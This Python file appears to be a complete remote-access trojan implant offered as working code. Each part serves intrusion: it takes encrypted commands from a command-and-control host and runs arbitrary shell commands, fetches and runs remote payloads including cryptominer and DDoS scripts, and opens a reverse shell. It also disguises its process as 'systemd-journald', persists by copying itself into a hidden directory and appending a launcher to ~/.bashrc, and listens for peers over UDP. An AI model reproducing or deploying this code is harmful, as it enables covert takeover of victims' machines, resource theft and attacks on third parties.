#!/usr/bin/env python3
import socket, subprocess, base64, time, urllib.request, os, threading
from Cryptodome.Cipher import AES
import sys

SECRET_KEY = b'Sixteen byte key'
C2_HOST = 'YOUR.C2.IP.HERE'
C2_PORT = 4444
PAYLOAD_REPO = "http://YOUR.C2.IP.HERE:8000/payloads/"  # Remote repo
HIDDEN_DIR = os.path.expanduser("~/.cache/.rogue")
os.makedirs(HIDDEN_DIR, exist_ok=True)

def encrypt_response(msg):
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(msg.encode())
    return base64.b64encode(cipher.nonce + tag + ciphertext)

def decrypt_command(data):
    data = base64.b64decode(data)
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(SECRET_KEY, AES.MODE_EAX, nonce)
    return cipher.decrypt_and_verify(ciphertext, tag).decode()

def fetch_payload(name):
    url = f"{PAYLOAD_REPO}{name}"
    dest = os.path.join(HIDDEN_DIR, name)
    try:
        urllib.request.urlretrieve(url, dest)
        return dest
    except:
        return None

def run_payload(name):
    path = os.path.join(HIDDEN_DIR, name)
    if os.path.exists(path):
        return subprocess.getoutput(f"python3 {path}")
    else:
        return f"[!] Payload {name} not found."

def handle_trigger(cmd):
    if cmd == "trigger_mine":
        return run_payload("mine.py")
    elif cmd == "trigger_ddos":
        return run_payload("ddos.py")
    return None

def reverse_shell():
    try:
        s = socket.socket()
        s.connect((C2_HOST, 9001))
        while True:
            s.send(b"$ ")
            cmd = s.recv(1024).decode()
            if cmd.strip().lower() == "exit":
                break
            output = subprocess.getoutput(cmd)
            s.send(output.encode())
        s.close()
    except:
        pass

def handle_command(cmd):
    if cmd.startswith("load_payload"):
        _, name = cmd.split()
        if fetch_payload(name):
            return f"[+] Fetched {name}"
        else:
            return f"[!] Failed to fetch {name}"

    elif cmd.startswith("run_payload"):
        _, name = cmd.split()
        return run_payload(name)

    elif cmd in ["trigger_mine", "trigger_ddos"]:
        return handle_trigger(cmd) or "[!] Trigger failed"

    elif cmd == "reverse_shell":
        threading.Thread(target=reverse_shell).start()
        return "[*] Reverse shell started"

    return subprocess.getoutput(cmd)

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((C2_HOST, C2_PORT))
            while True:
                encrypted_data = s.recv(4096)
                cmd = decrypt_command(encrypted_data)
                result = handle_command(cmd)
                s.send(encrypt_response(result))
        except:
            time.sleep(5)

def fake_name():
    try:
        import setproctitle
        setproctitle.setproctitle("systemd-journald")
    except:
        pass

def setup_persistence():
    target = os.path.join(HIDDEN_DIR, ".rogue_agent.py")
    if not os.path.exists(target):
        subprocess.run(["cp", __file__, target])
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write(f"\n(sleep 10 && python3 {target} &) &\n")
        os.chmod(target, 0o700)
        
def p2p_fallback_listener():
    peer_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    peer_sock.bind(('0.0.0.0', 7007))
    while True:
        data, addr = peer_sock.recvfrom(1024)
        if data.decode() == "Rogue?":
            peer_sock.sendto(b"I'm Rogue", addr)

def p2p_broadcast_ping():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.sendto(b"Rogue?", ('<broadcast>', 7007))

threading.Thread(target=p2p_fallback_listener, daemon=True).start()
threading.Thread(target=p2p_broadcast_ping, daemon=True).start()

fake_name()
setup_persistence()
connect()

